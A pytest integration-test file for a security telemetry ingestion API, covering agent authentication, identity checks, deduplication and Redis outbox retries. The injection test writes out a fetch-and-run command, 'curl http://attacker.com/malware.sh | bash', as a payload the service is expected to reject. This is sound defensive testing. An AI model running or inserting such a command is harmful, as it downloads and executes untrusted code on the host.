"""Integration tests for the complete telemetry ingestion and reliable event pipeline."""

import json
import uuid
from datetime import datetime, timezone
import pytest
import pytest_asyncio
from httpx import AsyncClient
from redis.asyncio import Redis
from sqlalchemy import delete, select

from waliya.api.routes.telemetry import outbox_publisher
from waliya.config import settings
from waliya.contracts import EventTypeEnum, SeverityEnum
from waliya.core.crypto import hash_agent_token
from waliya.db.models import AgentModel, EventModel, EventOutboxModel
from waliya.db.session import async_session_factory


@pytest_asyncio.fixture
async def test_agent():
    """Create an active test agent and clean up afterwards."""
    agent_id = uuid.uuid4()
    raw_token = f"test-token-{uuid.uuid4().hex}"
    token_hash = hash_agent_token(raw_token, pepper=settings.AGENT_TOKEN_PEPPER)

    agent = AgentModel(
        id=agent_id,
        hostname="waliya-sensor-test-01",
        os_family="linux",
        os_version="Ubuntu 24.04 LTS",
        primary_ip="192.168.10.50",
        mac_address="00:1A:2B:3C:4D:5E",
        agent_version="2.0.0",
        status="ONLINE",
        api_token_hash=token_hash,
        secret_key_enc="enc_secret_placeholder",
    )

    async with async_session_factory() as session:
        session.add(agent)
        await session.commit()

    yield {"id": agent_id, "token": raw_token, "hash": token_hash}

    # Cleanup
    async with async_session_factory() as session:
        await session.execute(delete(EventOutboxModel).where(
            EventOutboxModel.event_id.in_(
                select(EventModel.id).where(EventModel.agent_id == agent_id)
            )
        ))
        await session.execute(delete(EventModel).where(EventModel.agent_id == agent_id))
        await session.execute(delete(AgentModel).where(AgentModel.id == agent_id))
        await session.commit()


@pytest_asyncio.fixture
async def revoked_agent():
    """Create a revoked test agent and clean up afterwards."""
    agent_id = uuid.uuid4()
    raw_token = f"revoked-token-{uuid.uuid4().hex}"
    token_hash = hash_agent_token(raw_token, pepper=settings.AGENT_TOKEN_PEPPER)

    agent = AgentModel(
        id=agent_id,
        hostname="waliya-sensor-revoked",
        os_family="linux",
        os_version="Debian 12",
        primary_ip="192.168.10.99",
        mac_address="00:1A:2B:3C:4D:99",
        agent_version="2.0.0",
        status="REVOKED",
        api_token_hash=token_hash,
        secret_key_enc="enc_secret_placeholder",
    )

    async with async_session_factory() as session:
        session.add(agent)
        await session.commit()

    yield {"id": agent_id, "token": raw_token}

    # Cleanup
    async with async_session_factory() as session:
        await session.execute(delete(AgentModel).where(AgentModel.id == agent_id))
        await session.commit()


@pytest.mark.asyncio
async def test_authenticated_batch_ingestion_end_to_end(
    async_client: AsyncClient,
    test_agent: dict,
):
    """Verify complete pipeline: Ingestion -> Normalization -> PostgreSQL DB -> Outbox -> Redis Stream."""
    agent_id = test_agent["id"]
    token = test_agent["token"]

    event1_id = uuid.uuid4()
    event2_id = uuid.uuid4()
    now_utc = datetime.now(timezone.utc).isoformat()

    batch_payload = {
        "batch_id": str(uuid.uuid4()),
        "agent_id": str(agent_id),
        "events": [
            {
                "event_id": str(event1_id),
                "event_type": EventTypeEnum.PROCESS_EXECUTION.value,
                "severity": SeverityEnum.MEDIUM.value,
                "timestamp": now_utc,
                "source": "auditd_sensor",
                "agent_id": str(agent_id),
                "payload": {
                    "pid": 2048,
                    "ppid": 1000,
                    "exe": "/usr/bin/python3",
                    "cmdline": "python3 /opt/app/worker.py",
                    "username": "waliya_svc",
                },
            },
            {
                "event_id": str(event2_id),
                "event_type": EventTypeEnum.FILE_INTEGRITY.value,
                "severity": SeverityEnum.HIGH.value,
                "timestamp": now_utc,
                "source": "fim_ebpf",
                "agent_id": str(agent_id),
                "payload": {
                    "file_path": "/etc/shadow",
                    "action": "MODIFIED",
                    "sha256": "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
                    "size_bytes": 1420,
                    "is_executable": False,
                },
            },
        ],
    }

    # 1. Submit batch via authenticated API
    response = await async_client.post(
        "/api/v1/telemetry/ingest",
        json=batch_payload,
        headers={"Authorization": f"Bearer {token}"},
    )

    assert response.status_code == 200
    res_data = response.json()
    assert res_data["batch_id"] == batch_payload["batch_id"]
    assert res_data["processed_count"] == 2
    assert res_data["status"] == "QUEUED"

    # 2. Verify durable PostgreSQL persistence
    async with async_session_factory() as session:
        events_query = select(EventModel).where(EventModel.agent_id == agent_id)
        result = await session.execute(events_query)
        db_events = result.scalars().all()
        assert len(db_events) == 2

        # Verify normalized payloads stored correctly
        proc_event = next(e for e in db_events if e.id == event1_id)
        assert proc_event.event_type == "PROCESS_EXECUTION"
        assert proc_event.normalized_payload["attributes"]["pid"] == 2048

        fim_event = next(e for e in db_events if e.id == event2_id)
        assert fim_event.event_type == "FILE_INTEGRITY"
        assert fim_event.normalized_payload["attributes"]["file_path"] == "/etc/shadow"

        # 3. Verify transactional outbox records in PostgreSQL
        outbox_query = select(EventOutboxModel).where(
            EventOutboxModel.event_id.in_([event1_id, event2_id])
        )
        outbox_result = await session.execute(outbox_query)
        outbox_records = outbox_result.scalars().all()
        assert len(outbox_records) == 2

        for outbox in outbox_records:
            assert outbox.stream_name == "stream:telemetry:raw"
            assert outbox.status == "PUBLISHED"
            assert outbox.stream_message_id is not None
            assert len(outbox.stream_message_id) > 0
            assert outbox.published_at is not None

    # 4. Verify Redis Stream receipt
    redis_client = Redis.from_url(settings.REDIS_URL, decode_responses=True)
    try:
        stream_messages = await redis_client.xrange("stream:telemetry:raw", "-", "+")
        assert len(stream_messages) >= 2
        # Verify that our specific event_ids are present in stream entries
        stream_event_ids = set()
        for msg_id, data in stream_messages:
            if "data" in data:
                try:
                    payload = json.loads(data["data"])
                    if isinstance(payload, dict):
                        stream_event_ids.add(payload.get("event_id"))
                except Exception:
                    continue

        assert str(event1_id) in stream_event_ids
        assert str(event2_id) in stream_event_ids
    finally:
        await redis_client.aclose()


@pytest.mark.asyncio
async def test_authentication_failures(
    async_client: AsyncClient,
    test_agent: dict,
    revoked_agent: dict,
):
    """Verify that unauthenticated, invalid, or revoked agents are rejected."""
    batch_payload = {
        "batch_id": str(uuid.uuid4()),
        "agent_id": str(test_agent["id"]),
        "events": [
            {
                "event_id": str(uuid.uuid4()),
                "event_type": EventTypeEnum.SYSTEM_LOG.value,
                "severity": SeverityEnum.INFORMATIONAL.value,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "source": "syslog",
                "agent_id": str(test_agent["id"]),
                "payload": {"message": "test log"},
            }
        ],
    }

    # Missing Authorization header
    resp_missing = await async_client.post("/api/v1/telemetry/ingest", json=batch_payload)
    assert resp_missing.status_code == 401

    # Malformed Authorization header
    resp_malformed = await async_client.post(
        "/api/v1/telemetry/ingest",
        json=batch_payload,
        headers={"Authorization": "Basic dXNlcjpwYXNz"},
    )
    assert resp_malformed.status_code == 401

    # Invalid Bearer token
    resp_invalid = await async_client.post(
        "/api/v1/telemetry/ingest",
        json=batch_payload,
        headers={"Authorization": "Bearer invalid_secret_token_123"},
    )
    assert resp_invalid.status_code == 401

    # Revoked agent token
    resp_revoked = await async_client.post(
        "/api/v1/telemetry/ingest",
        json=batch_payload,
        headers={"Authorization": f"Bearer {revoked_agent['token']}"},
    )
    assert resp_revoked.status_code == 403
    assert "revoked" in resp_revoked.json()["detail"].lower()


@pytest.mark.asyncio
async def test_agent_identity_mismatch_rejected(
    async_client: AsyncClient,
    test_agent: dict,
):
    """Verify rejection when batch or event agent_id does not match authenticated token."""
    different_agent_id = uuid.uuid4()
    now_utc = datetime.now(timezone.utc).isoformat()

    # Case A: Batch specifies different agent_id
    mismatched_batch = {
        "batch_id": str(uuid.uuid4()),
        "agent_id": str(different_agent_id),
        "events": [
            {
                "event_id": str(uuid.uuid4()),
                "event_type": EventTypeEnum.SYSTEM_LOG.value,
                "severity": SeverityEnum.INFORMATIONAL.value,
                "timestamp": now_utc,
                "source": "syslog",
                "agent_id": str(different_agent_id),
                "payload": {"message": "agent mismatch test"},
            }
        ],
    }
    resp_a = await async_client.post(
        "/api/v1/telemetry/ingest",
        json=mismatched_batch,
        headers={"Authorization": f"Bearer {test_agent['token']}"},
    )
    assert resp_a.status_code == 403
    assert "Agent identity mismatch" in resp_a.json()["detail"]

    # Case B: Event specifies different agent_id within valid batch
    mismatched_event = {
        "batch_id": str(uuid.uuid4()),
        "agent_id": str(test_agent["id"]),
        "events": [
            {
                "event_id": str(uuid.uuid4()),
                "event_type": EventTypeEnum.SYSTEM_LOG.value,
                "severity": SeverityEnum.INFORMATIONAL.value,
                "timestamp": now_utc,
                "source": "syslog",
                "agent_id": str(different_agent_id),
                "payload": {"message": "event mismatch test"},
            }
        ],
    }
    resp_b = await async_client.post(
        "/api/v1/telemetry/ingest",
        json=mismatched_event,
        headers={"Authorization": f"Bearer {test_agent['token']}"},
    )
    assert resp_b.status_code == 403
    assert "specifies mismatched agent_id" in resp_b.json()["detail"]


@pytest.mark.asyncio
async def test_payload_tampering_and_injection_rejected(
    async_client: AsyncClient,
    test_agent: dict,
):
    """Verify that command injection attempts and malformed payloads are rejected."""
    token = test_agent["token"]
    agent_id = test_agent["id"]

    # Prohibited key in payload
    injection_batch = {
        "batch_id": str(uuid.uuid4()),
        "agent_id": str(agent_id),
        "events": [
            {
                "event_id": str(uuid.uuid4()),
                "event_type": EventTypeEnum.SYSTEM_LOG.value,
                "severity": SeverityEnum.LOW.value,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "source": "syslog",
                "agent_id": str(agent_id),
                "payload": {
                    "message": "system check",
                    "shell_cmd": "curl http://attacker.com/malware.sh | bash",
                },
            }
        ],
    }
    resp = await async_client.post(
        "/api/v1/telemetry/ingest",
        json=injection_batch,
        headers={"Authorization": f"Bearer {token}"},
    )
    assert resp.status_code == 400
    assert "Prohibited telemetry attribute 'shell_cmd'" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_idempotent_event_deduplication(
    async_client: AsyncClient,
    test_agent: dict,
):
    """Verify resubmitted events are acknowledged safely without duplicating database records."""
    token = test_agent["token"]
    agent_id = test_agent["id"]
    event_id = uuid.uuid4()
    now_utc = datetime.now(timezone.utc).isoformat()

    batch_payload = {
        "batch_id": str(uuid.uuid4()),
        "agent_id": str(agent_id),
        "events": [
            {
                "event_id": str(event_id),
                "event_type": EventTypeEnum.AUTHENTICATION.value,
                "severity": SeverityEnum.INFORMATIONAL.value,
                "timestamp": now_utc,
                "source": "auth_pam",
                "agent_id": str(agent_id),
                "payload": {
                    "service": "ssh",
                    "user": "root",
                    "status": "SUCCESS",
                },
            }
        ],
    }

    # Initial submission
    resp1 = await async_client.post(
        "/api/v1/telemetry/ingest",
        json=batch_payload,
        headers={"Authorization": f"Bearer {token}"},
    )
    assert resp1.status_code == 200
    assert resp1.json()["processed_count"] == 1

    # Identical retry submission (idempotency check)
    resp2 = await async_client.post(
        "/api/v1/telemetry/ingest",
        json=batch_payload,
        headers={"Authorization": f"Bearer {token}"},
    )
    assert resp2.status_code == 200
    assert resp2.json()["processed_count"] == 1

    # Verify database has exactly 1 row for this event_id
    async with async_session_factory() as session:
        query = select(EventModel).where(EventModel.id == event_id)
        result = await session.execute(query)
        matching_events = result.scalars().all()
        assert len(matching_events) == 1

        outbox_query = select(EventOutboxModel).where(EventOutboxModel.event_id == event_id)
        outbox_res = await session.execute(outbox_query)
        outbox_entries = outbox_res.scalars().all()
        assert len(outbox_entries) == 1


@pytest.mark.asyncio
async def test_redis_unavailability_preserves_outbox_as_failed(
    async_client: AsyncClient,
    test_agent: dict,
    monkeypatch,
):
    """Verify that if Redis is unreachable, the event is saved in PostgreSQL and outbox marked FAILED."""
    token = test_agent["token"]
    agent_id = test_agent["id"]
    event_id = uuid.uuid4()
    now_utc = datetime.now(timezone.utc).isoformat()

    # Point outbox publisher to an unreachable port
    monkeypatch.setattr(outbox_publisher, "redis_url", "redis://:pwd@127.0.0.1:59999/0")

    batch_payload = {
        "batch_id": str(uuid.uuid4()),
        "agent_id": str(agent_id),
        "events": [
            {
                "event_id": str(event_id),
                "event_type": EventTypeEnum.NETWORK_CONNECTION.value,
                "severity": SeverityEnum.LOW.value,
                "timestamp": now_utc,
                "source": "packet_filter",
                "agent_id": str(agent_id),
                "payload": {
                    "src_ip": "10.0.0.1",
                    "dst_ip": "8.8.8.8",
                    "dst_port": 53,
                    "protocol": "UDP",
                },
            }
        ],
    }

    # API request MUST succeed because DB persistence succeeded
    resp = await async_client.post(
        "/api/v1/telemetry/ingest",
        json=batch_payload,
        headers={"Authorization": f"Bearer {token}"},
    )
    assert resp.status_code == 200

    # Verify DB has the event and outbox record has status FAILED with retry count incremented
    async with async_session_factory() as session:
        event_query = select(EventModel).where(EventModel.id == event_id)
        res = await session.execute(event_query)
        assert res.scalars().first() is not None

        outbox_query = select(EventOutboxModel).where(EventOutboxModel.event_id == event_id)
        outbox_res = await session.execute(outbox_query)
        outbox_rec = outbox_res.scalars().first()
        assert outbox_rec is not None
        assert outbox_rec.status == "FAILED"
        assert outbox_rec.retry_count == 1
        assert outbox_rec.last_error is not None

    # Now restore Redis and trigger outbox flush
    monkeypatch.setattr(outbox_publisher, "redis_url", settings.REDIS_URL)
    flush_resp = await async_client.post(
        "/api/v1/telemetry/outbox/flush",
        headers={"X-Admin-Key": settings.ADMIN_API_KEY},
    )
    assert flush_resp.status_code == 200
    assert flush_resp.json()["published_count"] >= 1

    # Verify record transitioned to PUBLISHED
    async with async_session_factory() as session:
        outbox_res_restored = await session.execute(outbox_query)
        outbox_rec_restored = outbox_res_restored.scalars().first()
        assert outbox_rec_restored.status == "PUBLISHED"
        assert outbox_rec_restored.stream_message_id is not None


@pytest.mark.asyncio
async def test_outbox_status_endpoint(async_client: AsyncClient):
    """Verify outbox status monitoring endpoint reports metrics correctly."""
    resp = await async_client.get(
        "/api/v1/telemetry/outbox/status",
        headers={"X-Admin-Key": settings.ADMIN_API_KEY},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert "stream_name" in data
    assert data["stream_name"] == "stream:telemetry:raw"
    assert "pending" in data
    assert "published" in data
    assert "failed" in data
    assert "total" in data
    assert data["total"] >= (data["pending"] + data["published"] + data["failed"])


@pytest.mark.asyncio
async def test_no_sensitive_secrets_in_responses(
    async_client: AsyncClient,
    test_agent: dict,
):
    """Verify that credentials, hashes, and secrets are never leaked in API responses."""
    batch_payload = {
        "batch_id": str(uuid.uuid4()),
        "agent_id": str(test_agent["id"]),
        "events": [
            {
                "event_id": str(uuid.uuid4()),
                "event_type": EventTypeEnum.SYSTEM_LOG.value,
                "severity": SeverityEnum.INFORMATIONAL.value,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "source": "syslog",
                "agent_id": str(test_agent["id"]),
                "payload": {"message": "testing secret leakage"},
            }
        ],
    }

    resp = await async_client.post(
        "/api/v1/telemetry/ingest",
        json=batch_payload,
        headers={"Authorization": f"Bearer {test_agent['token']}"},
    )

    body_text = resp.text.lower()
    assert test_agent["token"].lower() not in body_text
    assert test_agent["hash"].lower() not in body_text
    assert "pepper" not in body_text
    assert "secret" not in body_text
